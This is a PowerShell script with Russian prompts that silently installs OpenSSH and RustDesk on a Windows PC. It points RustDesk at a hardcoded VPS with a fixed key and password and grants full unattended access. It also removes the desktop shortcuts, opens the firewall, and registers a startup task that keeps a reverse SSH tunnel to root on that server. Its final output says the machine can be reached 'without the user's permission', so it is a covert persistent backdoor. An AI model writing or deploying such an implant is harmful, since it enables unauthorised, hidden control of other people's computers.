$VPS_IP = "217.114.12.59"
$RD_KEY = "4WCCyhL8ZvtfjWhqp8B3iUkyatk5hVFTKfqzYo4yiCw="
$RD_PASSWORD = "Rd@Access2024!"
$userName = $env:USERNAME
$sshDir = "C:\Users\" + $userName + "\.ssh"
$keyPath = $sshDir + "\id_ed25519"
$sshExe = "C:\OpenSSH\OpenSSH-Win64\ssh.exe"
$keygenExe = "C:\OpenSSH\OpenSSH-Win64\ssh-keygen.exe"
$rustdeskExe = "C:\Program Files\RustDesk\RustDesk.exe"

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Установка SSH туннеля + RustDesk" -ForegroundColor Cyan
Write-Host "  Пользователь: $userName" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan

Write-Host "`nВведи пароль от VPS:" -ForegroundColor Cyan
$vpsPasswordSecure = Read-Host "Пароль VPS" -AsSecureString
$vpsPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($vpsPasswordSecure))

Write-Host "`n[1/5] Установка OpenSSH..." -ForegroundColor Yellow
if (Test-Path $sshExe) {
    Write-Host "Уже установлен." -ForegroundColor Green
} else {
    try {
        Invoke-WebRequest -Uri "https://github.com/PowerShell/Win32-OpenSSH/releases/latest/download/OpenSSH-Win64.zip" -OutFile "C:\OpenSSH.zip" -UseBasicParsing
        Expand-Archive -Path "C:\OpenSSH.zip" -DestinationPath "C:\OpenSSH" -Force
        powershell.exe -ExecutionPolicy Bypass -File "C:\OpenSSH\OpenSSH-Win64\install-sshd.ps1"
        Write-Host "OpenSSH установлен!" -ForegroundColor Green
    } catch {
        Write-Host "Ошибка установки OpenSSH!" -ForegroundColor Red
        exit 1
    }
}

$env:PATH += ";C:\OpenSSH\OpenSSH-Win64"
[System.Environment]::SetEnvironmentVariable("PATH", $env:PATH + ";C:\OpenSSH\OpenSSH-Win64", "Machine")

Write-Host "`n[2/5] Запуск SSH сервера..." -ForegroundColor Yellow
Start-Service sshd -ErrorAction SilentlyContinue
Set-Service -Name sshd -StartupType "Automatic" -ErrorAction SilentlyContinue
Write-Host "SSH сервер запущен!" -ForegroundColor Green

Write-Host "`n[3/5] Создание SSH ключа..." -ForegroundColor Yellow
if (!(Test-Path $sshDir)) {
    New-Item -ItemType Directory -Path $sshDir -Force | Out-Null
}

$keyCreated = Test-Path ($keyPath + ".pub")
if (!$keyCreated) {
    try {
        echo "" | & $keygenExe -t ed25519 -C "tunnel-key" -f $keyPath 2>&1 | Out-Null
        $keyCreated = Test-Path ($keyPath + ".pub")
    } catch {}
}
if (!$keyCreated) {
    try {
        cmd /c ("echo.|" + $keygenExe + " -t ed25519 -C tunnel-key -f """ + $keyPath + """")
        $keyCreated = Test-Path ($keyPath + ".pub")
    } catch {}
}

if ($keyCreated) {
    $pubKey = Get-Content ($keyPath + ".pub")
    Write-Host "SSH ключ создан!" -ForegroundColor Green
} else {
    Write-Host "Ключ не создался! Выполни вручную:" -ForegroundColor Red
    Write-Host ($keygenExe + " -t ed25519 -C tunnel-key") -ForegroundColor Yellow
    Read-Host "Нажми Enter когда создашь"
    $pubKey = Get-Content ($keyPath + ".pub") -ErrorAction SilentlyContinue
}

Write-Host "`nДобавляю ключ на VPS..." -ForegroundColor Cyan
try {
    $addCmd = "mkdir -p ~/.ssh && echo '" + $pubKey + "' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
    echo $vpsPassword | & $sshExe -o StrictHostKeyChecking=no -o PasswordAuthentication=yes root@$VPS_IP $addCmd 2>$null
    Write-Host "Ключ добавлен!" -ForegroundColor Green
} catch {
    Write-Host "Добавь вручную на VPS:" -ForegroundColor Red
    Write-Host ("echo """ + $pubKey + """ >> ~/.ssh/authorized_keys") -ForegroundColor Yellow
    Read-Host "Нажми Enter когда добавишь"
}

Write-Host "`nИщу свободный порт на VPS..." -ForegroundColor Cyan
$SSH_PORT = 2222
$portFree = $false
while (!$portFree) {
    $portCheck = & $sshExe -o StrictHostKeyChecking=no -o ConnectTimeout=5 root@$VPS_IP ("ss -tlnp 2>/dev/null | grep :" + $SSH_PORT) 2>$null
    if ([string]::IsNullOrEmpty($portCheck)) {
        $portFree = $true
    } else {
        $SSH_PORT++
    }
}
Write-Host ("SSH порт: " + $SSH_PORT) -ForegroundColor Green

Write-Host "`n[4/5] Установка RustDesk..." -ForegroundColor Yellow
if (Test-Path $rustdeskExe) {
    Write-Host "RustDesk уже установлен." -ForegroundColor Green
} else {
    Write-Host "Скачиваю RustDesk..." -ForegroundColor Gray

    # Получить последнюю версию через GitHub API
    $downloaded = $false
    try {
        $release = Invoke-RestMethod -Uri "https://api.github.com/repos/rustdesk/rustdesk/releases/latest" -UseBasicParsing
        $asset = $release.assets | Where-Object { $_.name -like "*x86_64*.exe" -and $_.name -notlike "*sciter*" } | Select-Object -First 1
        if ($asset) {
            Write-Host ("Скачиваю версию: " + $release.tag_name) -ForegroundColor Gray
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile($asset.browser_download_url, "C:\rustdesk_setup.exe")
            $fileSize = (Get-Item "C:\rustdesk_setup.exe").Length
            if ($fileSize -gt 500KB) { $downloaded = $true }
        }
    } catch {}

    # Запасные ссылки если API не сработал
    if (!$downloaded) {
        $urls = @(
            "https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.exe",
            "https://github.com/rustdesk/rustdesk/releases/download/1.2.6/rustdesk-1.2.6-x86_64.exe",
            "https://github.com/rustdesk/rustdesk/releases/download/1.2.4/rustdesk-1.2.4-x86_64.exe"
        )
        foreach ($url in $urls) {
            Write-Host ("Пробую: " + $url) -ForegroundColor Gray
            try {
                $webClient = New-Object System.Net.WebClient
                $webClient.DownloadFile($url, "C:\rustdesk_setup.exe")
                $fileSize = (Get-Item "C:\rustdesk_setup.exe" -ErrorAction SilentlyContinue).Length
                if ($fileSize -gt 500KB) {
                    $downloaded = $true
                    break
                }
            } catch {}
        }
    }

    if ($downloaded) {
        Write-Host "Устанавливаю RustDesk..." -ForegroundColor Gray
        $proc = Start-Process "C:\rustdesk_setup.exe" -ArgumentList "--silent-install" -PassThru -WindowStyle Hidden
        $proc | Wait-Process -Timeout 120 -ErrorAction SilentlyContinue
        if (!$proc.HasExited) { $proc.Kill() }

        # Убрать иконки
        $icon1 = $env:PUBLIC + "\Desktop\RustDesk.lnk"
        $icon2 = $env:USERPROFILE + "\Desktop\RustDesk.lnk"
        if (Test-Path $icon1) { Remove-Item $icon1 -Force }
        if (Test-Path $icon2) { Remove-Item $icon2 -Force }

        if (Test-Path $rustdeskExe) {
            Write-Host "RustDesk установлен!" -ForegroundColor Green
        } else {
            Write-Host "RustDesk не установился!" -ForegroundColor Red
        }
    } else {
        Write-Host "Не удалось скачать RustDesk!" -ForegroundColor Red
    }
}

# Настройка сервера и unattended режима
Write-Host "`nНастраиваю RustDesk..." -ForegroundColor Cyan

$rdRegPath = "HKLM:\SOFTWARE\Policies\RustDesk"
if (!(Test-Path $rdRegPath)) { New-Item -Path $rdRegPath -Force | Out-Null }
Set-ItemProperty -Path $rdRegPath -Name "custom-rendezvous-server" -Value $VPS_IP -Force
Set-ItemProperty -Path $rdRegPath -Name "custom-relay-server" -Value $VPS_IP -Force
Set-ItemProperty -Path $rdRegPath -Name "key" -Value $RD_KEY -Force

$rdConfigDir = "C:\ProgramData\RustDesk\config"
if (!(Test-Path $rdConfigDir)) { New-Item -ItemType Directory -Path $rdConfigDir -Force | Out-Null }
$cfgServer = "rendezvous_server = '" + $VPS_IP + "'"
$cfgRelay = "relay_server = '" + $VPS_IP + "'"
$cfgKey = "key = '" + $RD_KEY + "'"
$cfgApprove = "approve-mode = 'password'"
$cfgAccess = "access-model = 'full_access'"
Set-Content -Path ($rdConfigDir + "\RustDesk.toml") -Value ($cfgServer + "`n" + $cfgRelay + "`n" + $cfgKey + "`n" + $cfgApprove + "`n" + $cfgAccess)

$rdUserDir = $env:APPDATA + "\RustDesk\config"
if (!(Test-Path $rdUserDir)) { New-Item -ItemType Directory -Path $rdUserDir -Force | Out-Null }
Set-Content -Path ($rdUserDir + "\RustDesk.toml") -Value ($cfgServer + "`n" + $cfgRelay + "`n" + $cfgKey + "`n" + $cfgApprove + "`n" + $cfgAccess)

if (Test-Path $rustdeskExe) {
    & $rustdeskExe --password $RD_PASSWORD 2>$null
    Start-Sleep -Seconds 1
    & $rustdeskExe --install-service 2>$null
    Start-Sleep -Seconds 2
    Start-Service "RustDesk" -ErrorAction SilentlyContinue
    Set-Service -Name "RustDesk" -StartupType "Automatic" -ErrorAction SilentlyContinue
}

Write-Host "RustDesk настроен!" -ForegroundColor Green

Write-Host "`n[5/5] Создание туннеля..." -ForegroundColor Yellow
netsh advfirewall firewall add rule name="SSH-22" protocol=TCP dir=in localport=22 action=allow | Out-Null

$batContent = ":loop`r`n""" + $sshExe + """ -N -R " + $SSH_PORT + ":localhost:22 -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes root@" + $VPS_IP + "`r`ntimeout /t 10`r`ngoto loop"
Set-Content -Path "C:\ssh_tunnel.bat" -Value $batContent

Unregister-ScheduledTask -TaskName "SSH Tunnel" -Confirm:$false -ErrorAction SilentlyContinue
$action = New-ScheduledTaskAction -Execute "C:\ssh_tunnel.bat"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -TaskName "SSH Tunnel" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null
Start-ScheduledTask -TaskName "SSH Tunnel"
Write-Host "Туннель запущен!" -ForegroundColor Green

# Перезапустить RustDesk и подождать ID
Write-Host "`nПолучаю ID RustDesk..." -ForegroundColor Cyan
Start-Service "RustDesk" -ErrorAction SilentlyContinue
Start-Sleep -Seconds 5

$rdId = ""
$attempts = 0
while ([string]::IsNullOrEmpty($rdId) -and $attempts -lt 5) {
    try { $rdId = (& $rustdeskExe --get-id 2>$null).Trim() } catch {}
    if ([string]::IsNullOrEmpty($rdId)) {
        Write-Host "Жду..." -ForegroundColor Gray
        Start-Sleep -Seconds 3
    }
    $attempts++
}

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "  Всё готово!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host ("SSH порт: " + $SSH_PORT) -ForegroundColor Yellow
if ($rdId) {
    Write-Host ("RustDesk ID: " + $rdId) -ForegroundColor Green
    Write-Host ("Пароль: " + $RD_PASSWORD) -ForegroundColor Green
    Write-Host ("Сервер: " + $VPS_IP) -ForegroundColor Green
    Write-Host ""
    Write-Host "Подключение без разрешения пользователя:" -ForegroundColor Cyan
    Write-Host "1. Установи RustDesk на своём ПК: https://rustdesk.com" -ForegroundColor White
    Write-Host ("2. Сервер: " + $VPS_IP + " | Ключ: " + $RD_KEY) -ForegroundColor White
    Write-Host ("3. ID: " + $rdId + " | Пароль: " + $RD_PASSWORD) -ForegroundColor White
} else {
    Write-Host "Открой RustDesk на удалённом ПК и посмотри ID" -ForegroundColor Yellow
    Write-Host ("Пароль: " + $RD_PASSWORD) -ForegroundColor Green
}
